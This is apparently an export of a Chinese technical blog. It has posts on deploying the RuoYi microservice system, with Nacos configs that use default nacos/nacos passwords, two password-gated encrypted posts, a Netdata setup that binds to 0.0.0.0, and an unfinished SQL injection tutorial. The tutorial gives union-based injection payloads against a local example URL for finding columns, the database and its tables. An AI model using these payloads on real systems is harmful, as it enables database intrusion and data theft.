<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Tomcat</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="comment"># 应用名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ruoyi-gateway</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="comment"># 环境配置</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment"># 服务注册地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="comment"># 配置中心地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="comment"># 配置文件格式</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yml</span></span><br><span class="line">        <span class="comment"># 共享配置</span></span><br><span class="line">        <span class="attr">shared-configs:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="comment"># 取消控制台懒加载</span></span><br><span class="line">      <span class="attr">eager:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="comment"># 控制台地址</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8718</span></span><br><span class="line">      <span class="comment"># nacos配置持久化</span></span><br><span class="line">      <span class="attr">datasource:</span></span><br><span class="line">        <span class="attr">ds1:</span></span><br><span class="line">          <span class="attr">nacos:</span></span><br><span class="line">            <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">            <span class="attr">dataId:</span> <span class="string">sentinel-ruoyi-gateway</span></span><br><span class="line">            <span class="attr">groupId:</span> <span class="string">DEFAULT_GROUP</span></span><br><span class="line">            <span class="attr">data-type:</span> <span class="string">json</span></span><br><span class="line">            <span class="attr">rule-type:</span> <span class="string">gw-flow</span></span><br></pre></td></tr></table></figure>
<p><img src="a-a-o.png" alt=""></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Tomcat</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9300</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="comment"># 应用名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ruoyi-file</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="comment"># 环境配置</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment"># 服务注册地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="comment"># 配置中心地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="comment"># 配置文件格式</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yml</span></span><br><span class="line">        <span class="comment"># 共享配置</span></span><br><span class="line">        <span class="attr">shared-configs:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="a-a-p.png" alt=""></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Tomcat</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9202</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="comment"># 应用名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ruoyi-gen</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="comment"># 环境配置</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment"># 服务注册地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="comment"># 配置中心地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="comment"># 配置文件格式</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yml</span></span><br><span class="line">        <span class="comment"># 共享配置</span></span><br><span class="line">        <span class="attr">shared-configs:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br></pre></td></tr></table></figure>
<p><img src="a-a-s.png" alt=""></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Tomcat</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9203</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="comment"># 应用名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ruoyi-job</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="comment"># 环境配置</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment"># 服务注册地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="comment"># 配置中心地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="comment"># 配置文件格式</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yml</span></span><br><span class="line">        <span class="comment"># 共享配置</span></span><br><span class="line">        <span class="attr">shared-configs:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br></pre></td></tr></table></figure>
<p><img src="a-a-k.png" alt=""></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Tomcat</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9201</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="comment"># 应用名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ruoyi-system</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="comment"># 环境配置</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment"># 服务注册地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="comment"># 配置中心地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="comment"># 配置文件格式</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yml</span></span><br><span class="line">        <span class="comment"># 共享配置</span></span><br><span class="line">        <span class="attr">shared-configs:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br></pre></td></tr></table></figure>
<p><img src="a-a-l.png" alt=""></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Tomcat</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spring</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="comment"># 应用名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ruoyi-monitor</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="comment"># 环境配置</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment"># 服务注册地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="comment"># 配置中心地址</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">        <span class="comment"># 配置文件格式</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yml</span></span><br><span class="line">        <span class="comment"># 共享配置</span></span><br><span class="line">        <span class="attr">shared-configs:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">nacos</span> <span class="comment"># nacos 密码</span></span><br></pre></td></tr></table></figure>
<h3 id="运行">运行</h3>
<p>打开 ruoyi-master 下的bin目录,先执行clean.bat清理,再执行package.bat打包。<br>
打包完成后执行run-xxx.bat<br>
run-gateway.bat,run-auth.bat,run-modules-system.bat这三个必须运行，其余可选。</p>
<h2 id="前端运行">前端运行</h2>
<h3 id="配置-3">配置</h3>
<p>打开vue.config.js，将下图位置配置为网关的端口和ip<br>
<img src="a-b-t.png" alt=""></p>
<h3 id="运行-2">运行</h3>
<p>先在命令行执行<code>npm install</code><br>
再执行<code>npm run dev</code>即可运行<br>
<img src="a-a-z.png" alt=""></p>
<h1>生产环境部署</h1>
<p>在开发环境的基础上打包前后端代码即可对生产环境部署</p>
<h2 id="前端部署">前端部署</h2>
<p>在ruoyi-ui目录下执行<code>npm run build:prod</code>命令即可打包，打包完成后会生成dist目录，这个目录就是打包好的文件。<br>
<img src="a-a-v.png" alt=""><br>
<img src="a-a-n.png" alt=""><br>
打开小皮面板将nginx启动并添加网站目录。<br>
<img src="a-a-m.png" alt=""><br>
<img src="a-b-a.png" alt=""><br>
配置 Nginx 使前端的请求可以正确的转发到后端<br>
<img src="a-b-b.png" alt=""></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="comment"># 设置为部署目录</span></span><br><span class="line">        <span class="attribute">root</span>   <span class="string">&quot;D:/website/localhost_80&quot;</span>;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /prod-api/&#123;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$http_host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> REMOTE-HOST <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:8080/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 避免actuator暴露</span></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$uri</span> <span class="regexp">~ &quot;/actuator&quot;)</span> &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">    <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span>   html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后重启Nginx没有抛出错误即完成前端部署<br>
<img src="a-a-m.png" alt=""></p>
<h2 id="后端部署">后端部署</h2>
<p>部署前先运行起来 nacos,seata,mysql,redis，在开发环境中有写。<br>
打开 ruoyi-master/bin 目录，执行 clean.bat,再执行package.bat进行打包<br>
打包完成之后，根据下图把jar包复制出来用命令运行即可。<br>
<img src="a-b-q.png" alt=""><br>
<img src="a-b-w.png" alt=""><br>
此处可扩展业务代码，每个模块下都有jar包。打包后都在每个模块下的target目录下。<br>
<img src="a-b-e.png" alt=""><br>
最后还有下载的jars下的 sentinel-dashboard-1.8.8.jar 也要放到一起。<br>
<img src="a-b-r.png" alt=""><br>
最后使用以下命令来运行所有jar包。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar xxx.jar</span><br><span class="line"><span class="comment"># sentinel需要用以下命令运行</span></span><br><span class="line">java -Dserver.port=8718 -Dcsp.sentinel.dashboard.server=localhost:8718 -Dproject.name=sentinel-dashboard -Dcsp.sentinel.api.port=8719 -jar sentinel-dashboard-1.8.8.jar</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>nacos</tag>
        <tag>RuoYi</tag>
        <tag>若依管理系统</tag>
        <tag>微服务</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 系统部署与维护练习题</title>
    <url>/posts/8f70eb62/</url>
    <content><![CDATA[
          <style>
              #best-form {
                  width: 80%;
                  text-align: center;
                  margin: auto;
              }
              #best-form .inp {
                  width: 100%;
                  padding: 1em 0.5em;
                  margin: 0 0 1em 0;
                  border: 0;
                  outline: none;
                  border-bottom: 2px solid #ccc;
                  transition: ease .5s;
              }
              #best-form .inp:focus {
                  border: 0;
                  border-bottom: 2px solid orange;
              }
              #best-form input[type='submit'] {
                  font-size: 1.5em;
                  background: orange;
                  padding: 0.2em 0.5em;
                  color: white;
                  border-radius: 1em;
                  cursor: pointer;
                  border: 0;
              }
          </style>
          <form id="best-form">
              <h2>刷新页面即可恢复加密</h2>
              <input class="inp" type="text" id="best-name" placeholder="输入你的姓名">
              <input class="inp" type="password" id="best-username" placeholder="输入提供的账号">
              <input class="inp" type="password" id="best-password" placeholder="输入提供的密码">
              <input type="submit" value="验证">
          </form>
          <script>
              const sha256 = (text) => CryptoJS.SHA256(text).toString(CryptoJS.enc.Hex);
              document.querySelector('#best-form').addEventListener('submit', async function (e) {
                e.preventDefault();
                const name = this['best-name'].value;
                const username = this['best-username'].value;
                const password = this['best-password'].value;
                const users = [{"result":"","name":"785ca6708470f42b52906f604aed157bcc7f941008981311f0aa68bdef3567ae","account":"7c5d7795860f6d3efec596f1f4ec5980d8e5ce47d5f68fa47d43fc0858284022","salt":"592d2ec8a812e672f17b428338ee4ba2","post":["48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002","4aad6938451b398c8544546bb8dc9e17f8926d9d92ce3c400d552ffb05a9659b"]},{"result":"","name":"5dca4de7c25ef54fe2d0e3389b7e28e63b715e2911125343e110d31623aee81a","account":"cef472f90aeb4b39bcf8dcb875eca6a1c49a77835e697462711199985613ea69","salt":"592d2ec8a812e672f17b428338ee4ba2","post":["48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002"]}];
                if(name.trim() === '' || username.trim() === '' || password.trim() === '') {
                  alert("请输入信息");
                  return;
                };
                const id = '8f70eb62';
                let login = false;
                let index = -1;
                for(let i = 0;i<users.length;i++){
                  if(users[i].name === await sha256(name) && users[i].account === await sha256(username + password)){
                    for(let j = 0;j<users[i].post.length;j++){
                      if(users[i].post[j] === await sha256(id)){
                        login = true;
                        index = i
                      };
                    };
                  };
                };
                if(!login){
                  alert("检查信息是否有误，或是否申请本文权限。");
                  return;
                };
                const decryptData = decrypt(users[index].result,password,users[index].salt);
                this.style.display = 'none';
                document.querySelector("#article-container").innerHTML = decryptData;
            });
            function decrypt(data, password, slat) {
                const ivLength = 16;
                console.log("密文：",data);
                const ivHex = data.substring(0, ivLength * 2);
                const encryptDataHex = data.substring(ivLength * 2);
                const slatBuffer = CryptoJS.enc.Hex.parse(slat);
                const key = CryptoJS.PBKDF2(password, slatBuffer, {
                    keySize: 256 / 32,
                    iterations: 100000,
                    hasher: CryptoJS.algo.SHA256
                });
                const iv = CryptoJS.enc.Hex.parse(ivHex);
                const ciphertext = CryptoJS.enc.Hex.parse(encryptDataHex);
                try {
                    const decrypted = CryptoJS.AES.decrypt(
                        { ciphertext: ciphertext },
                        key,
                        {
                            iv,
                            mode: CryptoJS.mode.CFB,
                            padding: CryptoJS.pad.NoPadding
                        }
                    );
                    return decrypted.toString(CryptoJS.enc.Utf8);
                } catch (err) {
                    alert("解密失败", err.message);
                    return null;
                };
            };
          </script>
    ]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>RHEL8</tag>
        <tag>练习</tag>
      </tags>
  </entry>
  <entry>
    <title>路由交换技术考试</title>
    <url>/posts/ef817dbb/</url>
    <content><![CDATA[
          <style>
              #best-form {
                  width: 80%;
                  text-align: center;
                  margin: auto;
              }
              #best-form .inp {
                  width: 100%;
                  padding: 1em 0.5em;
                  margin: 0 0 1em 0;
                  border: 0;
                  outline: none;
                  border-bottom: 2px solid #ccc;
                  transition: ease .5s;
              }
              #best-form .inp:focus {
                  border: 0;
                  border-bottom: 2px solid orange;
              }
              #best-form input[type='submit'] {
                  font-size: 1.5em;
                  background: orange;
                  padding: 0.2em 0.5em;
                  color: white;
                  border-radius: 1em;
                  cursor: pointer;
                  border: 0;
              }
          </style>
          <form id="best-form">
              <h2>刷新页面即可恢复加密</h2>
              <input class="inp" type="text" id="best-name" placeholder="输入你的姓名">
              <input class="inp" type="password" id="best-username" placeholder="输入提供的账号">
              <input class="inp" type="password" id="best-password" placeholder="输入提供的密码">
              <input type="submit" value="验证">
          </form>
          <script>
              const sha256 = (text) => CryptoJS.SHA256(text).toString(CryptoJS.enc.Hex);
              document.querySelector('#best-form').addEventListener('submit', async function (e) {
                e.preventDefault();
                const name = this['best-name'].value;
                const username = this['best-username'].value;
                const password = this['best-password'].value;
                const users = [{"result":"","name":"785ca6708470f42b52906f604aed157bcc7f941008981311f0aa68bdef3567ae","account":"7c5d7795860f6d3efec596f1f4ec5980d8e5ce47d5f68fa47d43fc0858284022","salt":"9d8bdc2dcca8dcdc6ae40f0653960aa4","post":["48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002","4aad6938451b398c8544546bb8dc9e17f8926d9d92ce3c400d552ffb05a9659b"]},{"result":"","name":"5dca4de7c25ef54fe2d0e3389b7e28e63b715e2911125343e110d31623aee81a","account":"cef472f90aeb4b39bcf8dcb875eca6a1c49a77835e697462711199985613ea69","salt":"9d8bdc2dcca8dcdc6ae40f0653960aa4","post":["48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002"]}];
                if(name.trim() === '' || username.trim() === '' || password.trim() === '') {
                  alert("请输入信息");
                  return;
                };
                const id = 'ef817dbb';
                let login = false;
                let index = -1;
                for(let i = 0;i<users.length;i++){
                  if(users[i].name === await sha256(name) && users[i].account === await sha256(username + password)){
                    for(let j = 0;j<users[i].post.length;j++){
                      if(users[i].post[j] === await sha256(id)){
                        login = true;
                        index = i
                      };
                    };
                  };
                };
                if(!login){
                  alert("检查信息是否有误，或是否申请本文权限。");
                  return;
                };
                const decryptData = decrypt(users[index].result,password,users[index].salt);
                this.style.display = 'none';
                document.querySelector("#article-container").innerHTML = decryptData;
            });
            function decrypt(data, password, slat) {
                const ivLength = 16;
                console.log("密文：",data);
                const ivHex = data.substring(0, ivLength * 2);
                const encryptDataHex = data.substring(ivLength * 2);
                const slatBuffer = CryptoJS.enc.Hex.parse(slat);
                const key = CryptoJS.PBKDF2(password, slatBuffer, {
                    keySize: 256 / 32,
                    iterations: 100000,
                    hasher: CryptoJS.algo.SHA256
                });
                const iv = CryptoJS.enc.Hex.parse(ivHex);
                const ciphertext = CryptoJS.enc.Hex.parse(encryptDataHex);
                try {
                    const decrypted = CryptoJS.AES.decrypt(
                        { ciphertext: ciphertext },
                        key,
                        {
                            iv,
                            mode: CryptoJS.mode.CFB,
                            padding: CryptoJS.pad.NoPadding
                        }
                    );
                    return decrypted.toString(CryptoJS.enc.Utf8);
                } catch (err) {
                    alert("解密失败", err.message);
                    return null;
                };
            };
          </script>
    ]]></content>
      <tags>
        <tag>路由</tag>
        <tag>网络</tag>
        <tag>思科</tag>
      </tags>
  </entry>
  <entry>
    <title>netdata</title>
    <url>/posts/c3d71371/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>概述</h1>
<p>Netdata能够帮助用户实时监测系统的性能指标，提供丰富的可视化界面，使用户可以轻松查看各类指标，包括CPU使用率、内存占用、磁盘IO、网络流量等。<br>
Netdata自身的资源占用非常低，并且非常快。</p>
<h1>安装</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install netdata</span><br></pre></td></tr></table></figure>
<h1>配置</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/netdata/netdata.conf</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">        run as user = netdata</span><br><span class="line">        <span class="comment"># 这里为了方便用了root，生产环境下禁止用root用户</span></span><br><span class="line">        web files owner = root</span><br><span class="line">        web files group = root</span><br><span class="line">        <span class="comment"># Netdata is not designed to be exposed to potentially hostile</span></span><br><span class="line">        <span class="comment"># networks. See https://github.com/netdata/netdata/issues/164</span></span><br><span class="line">        <span class="comment"># 这里是为了让所有设备可以访问web页面，可以根据自己的需求来配置</span></span><br><span class="line">        <span class="built_in">bind</span> socket to IP = 0.0.0.0</span><br></pre></td></tr></table></figure>
<h1>启动</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动前记得放通19999端口</span></span><br><span class="line">service netdata start</span><br></pre></td></tr></table></figure>
<h1>停止</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service netdata stop</span><br></pre></td></tr></table></figure>
<h1>访问页面</h1>
<p>至此部署成功<br>
<img src="a-a-a.png" alt=""></p>
]]></content>
      <tags>
        <tag>netdata</tag>
        <tag>系统监控</tag>
        <tag>Centos 7</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全 SQL注入</title>
    <url>/posts/4fedeb6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>只说步骤，以下均用<code>http://localhost/index.php?id=1</code>来注入。以MySQL为例。</p>
<blockquote>
<p>实际情况请考虑转义字符。</p>
</blockquote>
<h1>用到的函数(根据实际情况使用)</h1>
<p><code>database()</code>：返回当前所在库。<br>
<code>length(string)</code>：返回字符串长度。<br>
<code>ascii(string)</code>：返回字符的ASCII码(int)。<br>
<code>SUBSTR(string,int1,int2)</code>：截取字符串，int1从1开始计数，是起始位置。int2为截至长度。</p>
<h1>显错注入</h1>
<ul>
<li>检测是否存在SQL注入，下述情况即存在。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 有数据</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br><span class="line"><span class="comment">-- 无数据</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用order by语句测试有多少字段，注意观察页面变化。这里假设有三个字段。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
<ul>
<li>查看当前所在哪一个库，这里id=5是查不出来数据的，这是为了第一条数据是查出来的库名，后面select语句的1，3是为了占位，因为一共有三个字段。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span></span><br></pre></td></tr></table></figure>
<ul>
<li>知道库名后(假设为user)，从系统表<code>information_schema.tables</code>查出user库下有哪些表。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">5</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;user&#x27;</span> limit <span class="number">0</span>,<span class="number">10</span></span><br></pre></td></tr></table></figure>
<h1>布尔盲注</h1>
<ul>
<li>检测是否存在SQL注入，下述情况即存在。</li>
</ul>
